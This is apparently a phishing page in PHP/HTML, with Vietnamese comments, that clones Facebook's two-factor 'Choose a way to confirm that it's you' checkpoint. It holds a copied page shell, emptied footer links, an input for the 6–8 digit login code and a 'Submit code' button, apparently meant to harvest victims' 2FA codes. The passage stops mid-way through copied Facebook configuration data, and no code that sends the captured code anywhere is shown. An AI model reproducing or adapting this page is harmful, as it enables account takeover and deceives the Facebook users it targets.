﻿<?php
session_start(); // Bắt đầu phiên làm việc (session)

// Lưu thông tin người dùng vào session
$_SESSION['user'] = array(
    'id' => 123,
    'username' => 'nguoidung1',
    'email' => 'nguoidung1@example.com'
);

// Sau đó, bạn có thể truy cập thông tin người dùng từ session bằng cách đọc $_SESSION['user']
?>
<html lang="en" id="facebook">

<head>
    <meta charset="utf-8" />
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.js"></script>
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }
        gtag('js', new Date());

        gtag('config', 'G-Y73DTZBVT5');
    </script>
    <script nonce="p7huT6ad">
        function envFlush(a) {
            function b(b) {
                for (var c in a) b[c] = a[c]
            }
            window.requireLazy ? window.requireLazy(["Env"], b) : (window.Env = window.Env || {}, b(window.Env))
        }
        envFlush({
            "useTrustedTypes": false,
            "isTrustedTypesReportOnly": false,
            "ajaxpipe_token": "AXjwJR68ihGLv-zzzcQ",
            "remove_heartbeat": false,
            "stack_trace_limit": 30,
            "timesliceBufferSize": 5000,
            "show_invariant_decoder": false,
            "compat_iframe_token": "AQ4WkqSIPlWMJxwjpB4",
            "isCQuick": false
        });
    </script>
    <script nonce="p7huT6ad">
        (function(a) {
            function b(b) {
                if (!window.openDatabase) return;
                b.I_AM_INCOGNITO_AND_I_REALLY_NEED_WEBSQL = function(a, b, c, d) {
                    return window.openDatabase(a, b, c, d)
                };
                window.openDatabase = function() {
                    throw new Error()
                }
            }
            b(a)
        })(this);
    </script>
    <style nonce="p7huT6ad"></style>
    <script nonce="p7huT6ad">
        __DEV__ = 0;
    </script><noscript>
        <meta http-equiv="refresh" content="0; URL=/checkpoint/?_fb_noscript=1" />
    </noscript>
    <link rel="manifest" id="MANIFEST_LINK" href="/data/manifest/" crossorigin="use-credentials" />
    <title id="pageTitle">Facebook</title>
    <link rel="search" type="application/opensearchdescription+xml" href="/osd.xml" title="Facebook" />
    <link rel="alternate" media="only screen and (max-width: 640px)" href="https://www.facebook.com/checkpoint/?locale2=en_GB" />
    <link rel="alternate" media="handheld" href="https://www.facebook.com/checkpoint/?locale2=en_GB" />

    <meta name="robots" content="noodp,noydir" />
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yE/l/0,cross/RspwE1UYLwr.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="Pud6B2Z" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yJ/l/0,cross/y5EgNEU5gVY.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="yHyxn9P" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yq/l/0,cross/sGPhW2q79c0.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="t29hWfM" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yi/l/0,cross/yotEdcUw9Gj.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="DcLQ9Pg" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/l/0,cross/651jOtTaSI9.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="KSZgfG2" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yg/l/0,cross/38vyyaAjg10.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="b5xEmfa" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y_/l/0,cross/eIoHA2W8E5U.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="+gV5Yf8" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yy/l/0,cross/201s7Ahyba6.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="kdBQtZx" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yq/l/0,cross/Gu2TRVy98_H.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="t9qKYdU" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yY/l/0,cross/eD3TYGXCkA6.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="u2lEGNZ" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yB/l/0,cross/foC4gVUEQiA.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="W7msqt2" crossorigin="anonymous" />
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/y1/r/tfeIHtC3542.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="+04aFS3" crossorigin="anonymous" nonce="p7huT6ad"></script>

    <style>
        @keyframes spinner {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        #loading-circle {
            position: fixed;
            top: 50%;
            left: 49%;
            transform: translate(-50%, -50%);
            z-index: 9999;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            animation: spin 1s linear infinite;
            display: none;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }

        }
    </style>

</head>

<body class="UIPage_LoggedOut _-kb _605a b_c3pyn-ahh chrome webkit win x1 Locale_en_GB" dir="ltr">
    <script type="text/javascript" nonce="p7huT6ad">
        requireLazy(["bootstrapWebSession"], function(j) {
            j(1693246649)
        })
    </script>
    <div class="_li" id="u_0_1_9r">
        <div id="pagelet_bluebar" data-referrer="pagelet_bluebar">
            <div id="blueBarDOMInspector" class="_21dp">
                <div id="bluebarRoot" class="_2t-8 _am-j _1s4v _2s1x _h2p">
                    <div aria-label="Facebook" class="_2t-a _26aw _33rf _2s1y" role="banner">
                        <div class="_2t-a _50tj">
                            <div class="_2t-a _4pmj _2t-d">
                                <div class="_2t-e">
                                    <div class="_4kny">
                                        <h1 class="_19ea" data-click="bluebar_logo"><a class="_7tp1" data-gt="&#123;&quot;chrome_nav_item&quot;:&quot;logo_chrome&quot;&#125;" href="https://www.facebook.com/?ref=logo" title="Go to Facebook home"><i class="_84x5 img sp_sgDK1AXE4z5 sx_5be9de"><u>Meta</u></i></a>
                                        </h1>
                                    </div>
                                </div>
                                <div class="_2t-f">
                                    <div class="_6a">
                                        <div class="_4kny"><a href="" class="_2s25 _cy7">Log out</a></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="globalContainer" class="uiContextualLayerParent">
            <div class="fb_content clearfix " id="content" role="main">
                <div class="_4-u5 _30ny">
                    <form class="checkpoint" id="u_0_2_BA"><input type="hidden" name="jazoest" value="2998" autocomplete="off" /><input type="hidden" name="fb_dtsg" value="nAlJP7MRuFc=" autocomplete="off" /><input type="submit" class="hidden_elem" data-default-submit="true" name="submit[Continue]" /><input type="hidden" autocomplete="off" name="nh" value="ea598973542069bff45f2cdf8feca550445e5191" />
                        <div class="_4-u2 _5x_7 _p0k _5x_9 _4-u8">
                            <div class="_2e9n" id="u_0_3_Tl"><strong id="u_0_4_AS">Choose a way to confirm that
                                    it&#039;s you</strong>
                                <div id="u_0_5_Kf"></div>
                            </div>
                            <div class="_2ph_">
                                <ul class="uiList _4kg _6-h _6-j _4kt">
                                    <li>
                                        <div class="_50f4">Your account has two-factor authentication enabled. This requires some additional steps to confirm this.</div>
                                    </li>
                                    <li>
                                        <div class="_50f4 _50f7">Approve from another device</div>
                                        <div class="_3-8y _50f4">We have sent notice to your Facebook. Please check your Facebook message and approve the confirmation to continue.</div>
                                    </li>
                                    <li>
                                        <div class="_50f4 _50f7">Or, enter your login code</div>
                                        <div class="_2w-j _50f4">Enter the 6 or 8 digit code sent to your phone number and email or from the authentication app that you set up.</div><span>
                                            <input type="text" class="inputtext code2faphp_input cgn mx-sm-3" tabindex="1" onkeypress="return event.charCode >= 48 && event.charCode <= 57" name="cgn" id="cgn" minlength="6" maxlength="8" required="" v-model="code2fa" autocomplete="off" placeholder="Login code" aria-label="Login code" /></span>
                                        <p class="2fa-error" style="color:red;font-size:14px;margin-left: 0px;margin-top: 5px;"></p>
                                    </li>
                                </ul>
                            </div>
                            <div class="_5hzs" id="checkpointBottomBar">
                                <div class="_2s5p"><button class="_42ft _4jy0 _2kak _4jy4 _4jy1 selected _51sy submit_2fa" name="FaButton" id="submit_2fa" type="button">Submit code</button></div>
                                <div class="_2s5q">
                                    <div class="_25b6" id="u_0_6_ZV"><a role="button" id="u_0_7_HB">Resend the login code </a></div>
                                </div>
                            </div>
                        </div>
                    </form>
                </div>
                <div id="loading-circle"></div>
            </div>
            <div>
                <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
                    <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
                        <li>English (UK)</li>

                        <li><a class="_sv4" dir="ltr" href="" title="Traditional Chinese (Taiwan)">中文(台灣)</a></li>
                        <li><a class="_sv4" dir="ltr" href="" title="Korean">한국어</a></li>
                        <li><a class="_sv4" dir="ltr" href="" title="Japanese">日本語</a></li>
                        <li><a class="_sv4" dir="ltr" href="" title="French (France)">Français (France)</a></li>
                        <li><a class="_sv4" dir="ltr" href="" title="Thai">ภาษาไทย</a></li>
                        <li><a class="_sv4" dir="ltr" href="" title="Spanish">Español</a></li>
                        <li><a class="_sv4" dir="ltr" href="" title="Portuguese (Brazil)">Português (Brasil)</a></li>
                        <li><a class="_sv4" dir="ltr" href="" title="German">Deutsch</a></li>
                        <li><a class="_sv4" dir="ltr" href="" title="Italian">Italiano</a></li>
                        <li><a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog" ajaxify="/settings/language/language/?uri=https%3A%2F%2Fit-it.facebook.com%2Fcheckpoint%2F&amp;source=www_list_selector_more" href="#" title="Show more languages"><i class="img sp_EP9wX8qDDvu sx_0de3e6"></i></a>
                        </li>
                    </ul>
                    <div id="contentCurve"></div>
                    <div id="pageFooterChildren" role="contentinfo" aria-label="Facebook site links">
                        <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
                            <li><a href="" title="Sign up for Facebook">Sign Up</a></li>
                            <li><a href="" title="Log in to Facebook">Log in</a></li>
                            <li><a href="" title="Take a look at Messenger.">Messenger</a></li>
                            <li><a href="" title="Facebook Lite for Android.">Facebook Lite</a></li>
                            <li><a href="" title="Browse in Video">Video</a></li>
                            <li><a href="" title="Take a look at popular places on Facebook.">Places</a></li>
                            <li><a href="" title="Check out Facebook games.">Games</a></li>
                            <li><a href="" title="Buy and sell on Facebook Marketplace.">Marketplace</a>
                            </li>
                            <li><a href="" title="Learn more about Meta Pay" target="_blank">Meta Pay</a></li>
                            <li><a href="" title="Discover Meta" target="_blank">Meta Store</a>
                            </li>
                            <li><a href="" title="Learn more about Meta Quest" target="_blank">Meta Quest</a></li>
                            <li><a href="" title="Take a look at Instagram" target="_blank" rel="noreferrer nofollow" data-lynx-mode="asynclazy">Instagram</a></li>
                            <li><a href="" title="Check out Threads" target="_blank" rel="noreferrer nofollow" data-lynx-mode="asynclazy">Threads</a></li>
                            <li><a href="" title="Donate to worthy causes.">Fundraisers</a></li>
                            <li><a href="" title="Browse our Facebook Services directory.">Services</a>
                            </li>
                            <li><a href="" title="See the Voting Information Centre">Voting Information Centre</a></li>
                            <li><a href="" title="Learn how we collect, use and share information to support Facebook.">Privacy
                                    Policy</a></li>
                            <li><a href="" title="Learn how to manage and control your privacy on Facebook.">Privacy Centre</a>
                            </li>
                            <li><a href="" title="Explore our groups.">Groups</a></li>
                            <li><a href="" accesskey="8" title="Read our blog, discover the resource centre and find job opportunities.">About</a>
                            </li>
                            <li><a href="" title="Advertise on Facebook">Create ad</a></li>
                            <li><a href="" title="Create a Page">Create Page</a></li>
                            <li><a href="" title="Develop on our platform.">Developers</a></li>
                            <li><a href="" title="Make your next career move to our brilliant company.">Careers</a></li>
                            <li><a href="" title="Learn about cookies and Facebook." data-nocookies="1">Cookies</a></li>
                            <li><a class="_41ug" data-nocookies="1" href="" title="Learn about AdChoices.">AdChoices<i class="img sp_EP9wX8qDDvu sx_6bdd81"></i></a></li>
                            <li><a data-nocookies="1" href="" accesskey="9" title="Review our terms and policies.">Terms</a></li>
                            <li><a href="" accesskey="0" title="Visit our Help Centre.">Help</a></li>
                            <li><a href="" title="Visit our contact uploading and non-users notice.">Contact uploading and
                                    non-users</a></li>
                            <li><a accesskey="6" class="accessible_elem" href="" title="View and edit your Facebook settings.">Settings</a></li>
                            <li><a accesskey="7" class="accessible_elem" href="" title="View your activity log">Activity log</a></li>
                        </ul>
                    </div>
                    <div class="mvl copyright">
                        <div><span> Meta © 2023</span></div>
                    </div>
                </div>
            </div>
        </div>
        <div></div><span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none" /></span>
    </div>
    <div style="display:none">
        <div></div>
    </div>
    <script type="text/javascript" nonce="p7huT6ad">
        /*<![CDATA[*/
        (function() {
            if (top != self) {
                try {
                    if (parent != top) {
                        throw 1;
                    }
                    var si_cj_d = ["apps.facebook.com", "apps.beta.facebook.com"];
                    var href = top.location.href.toLowerCase();
                    for (var i = 0; i < si_cj_d.length; i++) {
                        if (href.indexOf(si_cj_d[i]) >= 0) {
                            throw 1;
                        }
                    }
                } catch (e) {
                    window.document.write("\u003Cstyle nonce=\"p7huT6ad\">body * {display:none !important;}\u003C\/style>\u003Ca href=\"#\" onclick=\"top.location.href=window.location.href\" style=\"display:block !important;padding:10px\">Go to Facebook.com\u003C\/a>"); /*PzRM6oOL*/
                }
            }
        }()) /*]]>*/
    </script>
    <script>
        requireLazy(["HasteSupportData"], function(m) {
            m.handle({
                "bxData": {
                    "341": {
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/yq\/r\/6GWWpVF4mX_.kf"
                    },
                    "342": {
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/yG\/r\/MBfABwfm_XD.kf"
                    },
                    "343": {
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/y-\/r\/aQMvfnkT9nJ.kf"
                    },
                    "344": {
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/yx\/r\/blfwJwX66mu.kf"
                    },
                    "1296777": {
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/yx\/r\/Cr4EZHIAboA.kf"
                    },
                    "1298261": {
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/ym\/r\/UMN8cW4Zohq.kf"
                    },
                    "1375852": {
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/yO\/r\/9JrgFwT_Y3a.wasm"
                    },
                    "1901873": {
                        "uri": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/yq\/r\/4ItoL2NpEeW.kf"
                    }
                },
                "clpData": {
                    "1985308": {
                        "r": 1,
                        "s": 1
                    },
                    "2177": {
                        "r": 1,
                        "s": 1
                    },
                    "2631": {
                        "r": 1,
                        "s": 1
                    },
                    "1944": {
                        "r": 1,
                        "s": 1
                    },
                    "4883": {
                        "r": 1,
                        "s": 1
                    },
                    "1743656": {
                        "r": 1
                    },
                    "1744178": {
                        "r": 1,
                        "s": 1
                    },
                    "1744251": {
                        "r": 100,
                        "s": 1
                    },
                    "1744349": {
                        "r": 1
                    },
                    "819": {
                        "r": 1,
                        "s": 1
                    },
                    "1744057": {
                        "r": 500,
                        "s": 1
                    },
                    "1744058": {
                        "r": 5000,
                        "s": 1
                    },
                    "1744059": {
                        "r": 10000,
                        "s": 1
                    },
                    "1744060": {
                        "r": 1000,
                        "s": 1
                    },
                    "1857112": {
                        "r": 1
                    },
                    "1743887": {
                        "r": 1
                    },
                    "1755537": {
                        "r": 1
                    },
                    "1828945": {
                        "r": 100,
                        "s": 1
                    },
                    "1276": {
                        "r": 100,
                        "s": 1
                    }
                },
                "gkxData": {
                    "6479": {
                        "result": false,
                        "hash": "AT7Gy1m-1oe3_mGtekY"
                    },
                    "8671": {
                        "result": false,
                        "hash": "AT6YxS2KxzgMAsCklYU"
                    },
                    "996940": {
                        "result": false,
                        "hash": "AT7opYuEGy3sjG1a1co"
                    },
                    "5498": {
                        "result": false,
                        "hash": "AT71991PwRJukp3OT80"
                    },
                    "5658": {
                        "result": false,
                        "hash": "AT5RFlDOrZtpNc9cySs"
                    },
                    "227": {
                        "result": true,
                        "hash": "AT5yXnJxXfkiddJS7CM"
                    },
                    "229": {
                        "result": true,
                        "hash": "AT6ACjjf9sN9o2h-wRw"
                    },
                    "231": {
                        "result": true,
                        "hash": "AT5RtBjo7qezdTuh8UE"
                    },
                    "233": {
                        "result": true,
                        "hash": "AT7HvkjZGXZeuumhriY"
                    },
                    "235": {
                        "result": true,
                        "hash": "AT4gizq47dTbAJ5jenQ"
                    },
                    "443": {
                        "result": false,
                        "hash": "AT4h1HaIxHYZn6IYyfU"
                    },
                    "1393": {
                        "result": false,
                        "hash": "AT42aEHIHsK_NxGQjuY"
                    },
                    "1459": {
                        "result": false,
                        "hash": "AT60sF8lwSNwCEwZ6vk"
                    },
                    "1475": {
                        "result": false,
                        "hash": "AT7kEzfGQyTYdZJbOfA"
                    },
                    "1705": {
                        "result": false,
                        "hash": "AT45JGOqDPcAMbr3q6I"
                    },
                    "2030": {
                        "result": true,
                        "hash": "AT77OC0fYHb5VHYBVkc"
                    },
                    "2254": {
                        "result": true,
                        "hash": "AT4NaskuQ6OBD3qC9fE"
                    },
                    "2384": {
                        "result": true,
                        "hash": "AT4x6YeodUS0Ma4JC-0"
                    },
                    "2448": {
                        "result": true,
                        "hash": "AT7EwlgtPzpIx-1Qu2w"
                    },
                    "2458": {
                        "result": true,
                        "hash": "AT5Dy7G1iL0c6SKnOTQ"
                    },
                    "2581": {
                        "result": false,
                        "hash": "AT4iw_6E9ISmVfQLt8o"
                    },
                    "2772": {
                        "result": false,
                        "hash": "AT5Eu244WIce7iwq3EY"
                    },
                    "2954": {
                        "result": false,
                        "hash": "AT6DTo5oWw4Gi2ycpr4"
                    },
                    "3140": {
                        "result": false,
                        "hash": "AT5-c9fjLEKqfwwAbIo"
                    },
                    "3212": {
                        "result": false,
                        "hash": "AT7tgdobiEoC5qOAmps"
                    },
                    "3400": {
                        "result": false,
                        "hash": "AT5LV5sAIJng7-zc_e8"
                    },
                    "3598": {
                        "result": false,
                        "hash": "AT4R-V-zd8OVuUkT2AI"
                    },
                    "3696": {
                        "result": false,
                        "hash": "AT642NL_ojYpVxbebUY"
                    },
                    "3752": {
                        "result": false,
                        "hash": "AT6eS5UTkkMp_xbPQiY"
                    },
                    "3773": {
                        "result": false,
                        "hash": "AT7VZ_gM5R4NLSLm_qg"
                    },
                    "3831": {
                        "result": false,
                        "hash": "AT4W23lQ0XxAZniMZuY"
                    },
                    "4075": {
                        "result": false,
                        "hash": "AT4_ZQi0sTjSt-RxsB0"
                    },
                    "4180": {
                        "result": true,
                        "hash": "AT6ZBPDX_t1nVduV3bs"
                    },
                    "4427": {
                        "result": false,
                        "hash": "AT6_VQpafkoVtvNR2XY"
                    },
                    "4635": {
                        "result": true,
                        "hash": "AT66qmoOXbBCI2Vn-5s"
                    },
                    "4639": {
                        "result": false,
                        "hash": "AT6fuwnCZ25Hjx2lI6M"
                    },
                    "4855": {
                        "result": false,
                        "hash": "AT4AzyKRxx1EonInPWE"
                    },
                    "5223": {
                        "result": false,
                        "hash": "AT7mncAklIbGZfnPX98"
                    },
                    "5403": {
                        "result": false,
                        "hash": "AT5zCIAplAr2jSMZiqE"
                    },
                    "5840": {
                        "result": false,
                        "hash": "AT4yZS6129LYTjoc_hg"
                    },
                    "5945": {
                        "result": false,
                        "hash": "AT75NnnIUkzdzhWf-ig"
                    },
                    "6017": {
                        "result": true,
                        "hash": "AT6VK36mN-p0kfQg0o0"
                    },
                    "6651": {
                        "result": false,
                        "hash": "AT5bQZkTYnEg4MI5YYU"
                    },
                    "6810": {
                        "result": false,
                        "hash": "AT6JsT-epn3stgDmEro"
                    },
                    "7058": {
                        "result": false,
                        "hash": "AT575sHkjZ8bxfHnA3Y"
                    },
                    "7647": {
                        "result": true,
                        "hash": "AT7SlHuE7faXrc8quCQ"
                    },
                    "8058": {
                        "result": false,
                        "hash": "AT6nG0MwuAD5a6ETEp8"
                    },
                    "8126": {
                        "result": false,
                        "hash": "AT4U7qG06p9sF6u8Y84"
                    },
                    "8232": {
                        "result": false,
                        "hash": "AT7JZiM_jgftdVDLoZM"
                    },
                    "8296": {
                        "result": false,
                        "hash": "AT5d7tZn-pUr-1CUspM"
                    },
                    "678680": {
                        "result": false,
                        "hash": "AT4Y-6Ul9ZZckQZng_s"
                    },
                    "764802": {
                        "result": true,
                        "hash": "AT4tFUbd4DXC-8IGbTs"
                    },
                    "864221": {
                        "result": false,
                        "hash": "AT6lzgFNagxj0jJEikc"
                    },
                    "894204": {
                        "result": false,
                        "hash": "AT7MWh7MKvvrwCN_FT8"
                    },
                    "950768": {
                        "result": false,
                        "hash": "AT434vVJ93bUu52yVD8"
                    },
                    "1028105": {
                        "result": true,
                        "hash": "AT7-ML1GcM8r4D_3bhE"
                    },
                    "1070695": {
                        "result": false,
                        "hash": "AT711tHzdMfRy3F3lww"
                    },
                    "1099893": {
                        "result": false,
                        "hash": "AT5kly2LSZV_DKGRaok"
                    },
                    "1133447": {
                        "result": false,
                        "hash": "AT6gnU9itzgx89ty9_o"
                    },
                    "1151941": {
                        "result": false,
                        "hash": "AT4VtFw2xNGXhISyNYA"
                    },
                    "1183591": {
                        "result": false,
                        "hash": "AT7-K0n_WuTMXMf0fjo"
                    },
                    "1217157": {
                        "result": false,
                        "hash": "AT6B7YmllOsArnK6Cu0"
                    },
                    "1243442": {
                        "result": false,
                        "hash": "AT6H-KKvL_2kq8U2xi8"
                    },
                    "1250838": {
                        "result": false,
                        "hash": "AT7z1NkFlLfUKocWkn0"
                    },
                    "1293035": {
                        "result": false,
                        "hash": "AT6f-b10jzF6b9M9zSY"
                    },
                    "1299319": {
                        "result": false,
                        "hash": "AT7zRIpVRWl8hiUYJis"
                    },
                    "1343107": {
                        "result": false,
                        "hash": "AT4KQfjN4IrPr-rGbDc"
                    },
                    "1361312": {
                        "result": true,
                        "hash": "AT7j_UZvEWHLaX5EWrQ"
                    },
                    "1364812": {
                        "result": false,
                        "hash": "AT4i7QBeCSHKemDKFVg"
                    },
                    "1382775": {
                        "result": false,
                        "hash": "AT7D5sd_gmE2NRtmSOE"
                    },
                    "1383502": {
                        "result": false,
                        "hash": "AT51zMR8DxFUUVJ8itg"
                    },
                    "1388683": {
                        "result": false,
                        "hash": "AT63PwzAsKGj12Q6LmU"
                    },
                    "1404445": {
                        "result": true,
                        "hash": "AT44iyAnDiXZ03Q6R5U"
                    },
                    "1407308": {
                        "result": false,
                        "hash": "AT6g20u7kv9f37jOb10"
                    },
                    "1470120": {
                        "result": false,
                        "hash": "AT7hoNhuKStHslT5zE0"
                    },
                    "1537962": {
                        "result": false,
                        "hash": "AT6YWgGMjb0fUWs1pxc"
                    },
                    "1554827": {
                        "result": false,
                        "hash": "AT7zueGLhGo0cT5x2DY"
                    },
                    "1616314": {
                        "result": false,
                        "hash": "AT6Zl4nWIeZ_AYDrtts"
                    },
                    "1642984": {
                        "result": false,
                        "hash": "AT71oE1xc4ID8xb40cA"
                    },
                    "1647650": {
                        "result": false,
                        "hash": "AT53XjirJWrOJFGYWUI"
                    },
                    "1690028": {
                        "result": false,
                        "hash": "AT7vV-7CyHNNfGJoCQ4"
                    },
                    "1703328": {
                        "result": true,
                        "hash": "AT49L03pP2X9HmsnnHQ"
                    },
                    "1707273": {
                        "result": false,
                        "hash": "AT5oTb36da_qc9QIjq0"
                    },
                    "1721477": {
                        "result": true,
                        "hash": "AT70IfYeUvLOKY5Yw_w"
                    },
                    "1723588": {
                        "result": false,
                        "hash": "AT485K2jwU-S2ruR_Yc"
                    },
                    "1738486": {
                        "result": false,
                        "hash": "AT4cX37oQco6DwhUWiA"
                    },
                    "1778371": {
                        "result": false,
                        "hash": "AT6HtWXGEXFDQ5JjTl8"
                    },
                    "1861546": {
                        "result": false,
                        "hash": "AT7TDKkMR4gPryZg8tU"
                    },
                    "1863055": {
                        "result": false,
                        "hash": "AT7ONu9dmdwXlowbNCY"
                    },
                    "1872325": {
                        "result": false,
                        "hash": "AT4WDV07rUK5enGiNBM"
                    },
                    "1902022": {
                        "result": false,
                        "hash": "AT7WD_stYlEMqW8ciMY"
                    },
                    "1908135": {
                        "result": false,
                        "hash": "AT6miGypJl3m2Aq48hQ"
                    },
                    "1914427": {
                        "result": true,
                        "hash": "AT7r7RL9lwTjh6wx4ms"
                    },
                    "1954666": {
                        "result": true,
                        "hash": "AT7b0uZjlePjuRBXAU4"
                    },
                    "307": {
                        "result": true,
                        "hash": "AT5dPMZBMiNY0f7uv-k"
                    },
                    "762": {
                        "result": false,
                        "hash": "AT7XePNdehhQhxt406k"
                    },
                    "2795": {
                        "result": false,
                        "hash": "AT5ilL0A5sDVhuaBQvg"
                    },
                    "5639": {
                        "result": true,
                        "hash": "AT5SF61ZadJ9LozlDWA"
                    },
                    "778292": {
                        "result": false,
                        "hash": "AT574OhXHwX0kRP2uWI"
                    },
                    "832242": {
                        "result": false,
                        "hash": "AT7QZmREZ7b0HQdOrpE"
                    },
                    "945829": {
                        "result": true,
                        "hash": "AT6KFs8jy_GkmgnU9Js"
                    },
                    "968609": {
                        "result": true,
                        "hash": "AT7nKteWCVYK6uN6SOk"
                    },
                    "1001007": {
                        "result": false,
                        "hash": "AT54HpnriRBxXJ_MSXw"
                    },
                    "1066746": {
                        "result": false,
                        "hash": "AT55_E5b8Sj7u5rUPdk"
                    },
                    "1166607": {
                        "result": false,
                        "hash": "AT7xrOkGBcaF8I5u6LE"
                    },
                    "574": {
                        "result": false,
                        "hash": "AT5l2P5ytV2bv8xHVWs"
                    },
                    "871": {
                        "result": true,
                        "hash": "AT4vyfQGHTBrTQa9Ct4"
                    },
                    "1626": {
                        "result": false,
                        "hash": "AT6XwrJGGF9CvtwshtQ"
                    },
                    "2674": {
                        "result": false,
                        "hash": "AT6LknPzbQEjKsuxarA"
                    },
                    "2819": {
                        "result": false,
                        "hash": "AT77OwnXENquugNcbeo"
                    },
                    "6002": {
                        "result": false,
                        "hash": "AT6qjxreNXGYgzg6gDw"
                    },
                    "1941": {
                        "result": false,
                        "hash": "AT7GrgqG15p_qcSMUl0"
                    },
                    "3404": {
                        "result": false,
                        "hash": "AT4wMZMWwnW5SJKEGds"
                    },
                    "524": {
                        "result": false,
                        "hash": "AT6SLNReg1ijh3bZ8hc"
                    },
                    "4240": {
                        "result": false,
                        "hash": "AT6WMihLvltJm0Uj71M"
                    },
                    "8594": {
                        "result": false,
                        "hash": "AT7Gfw9P9vYQkIA2mac"
                    },
                    "1787898": {
                        "result": true,
                        "hash": "AT5WGsLz9GCUYq8UqBg"
                    },
                    "1924645": {
                        "result": false,
                        "hash": "AT7xqjINkJcipyjZStE"
                    },
                    "201": {
                        "result": false,
                        "hash": "AT4alnh_4NnV8Qd_PlI"
                    },
                    "2257": {
                        "result": false,
                        "hash": "AT5Mac_Q9jALVGtdRq0"
                    },
                    "6361": {
                        "result": false,
                        "hash": "AT6feNNR6dFIlUi3C0E"
                    },
                    "6862": {
                        "result": false,
                        "hash": "AT68ofpcSp7CAzMdwmQ"
                    },
                    "7518": {
                        "result": false,
                        "hash": "AT4evLW9Sc-7F07WrfA"
                    },
                    "8003": {
                        "result": false,
                        "hash": "AT5keQOwqmgpohoaUqQ"
                    },
                    "1401060": {
                        "result": true,
                        "hash": "AT5aetN5Gb3reIXVPG0"
                    },
                    "1596063": {
                        "result": false,
                        "hash": "AT7JHuDWtaOqRuBUF8A"
                    },
                    "1778302": {
                        "result": false,
                        "hash": "AT65fisZhmc2X92ECwI"
                    },
                    "1840809": {
                        "result": false,
                        "hash": "AT5nYctoTsr7alRiEAw"
                    }
                },
                "ixData": {
                    "11629": {
                        "sprited": 1,
                        "spriteCssClass": "sx_b909a3",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "122194": {
                        "sprited": 1,
                        "spriteCssClass": "sx_e1b84b",
                        "spriteMapCssClass": "sp_v2IbqLbsOPn"
                    },
                    "124199": {
                        "sprited": 1,
                        "spriteCssClass": "sx_e77f38",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "124209": {
                        "sprited": 1,
                        "spriteCssClass": "sx_39c29c",
                        "spriteMapCssClass": "sp_IJHHeo89W29"
                    },
                    "153316": {
                        "sprited": 1,
                        "spriteCssClass": "sx_e8e072",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "295462": {
                        "sprited": 1,
                        "spriteCssClass": "sx_6266d0",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "295474": {
                        "sprited": 1,
                        "spriteCssClass": "sx_656b8e",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
                    },
                    "295488": {
                        "sprited": 1,
                        "spriteCssClass": "sx_1b9e2e",
                        "spriteMapCssClass": "sp_WolRyY-18Wy"
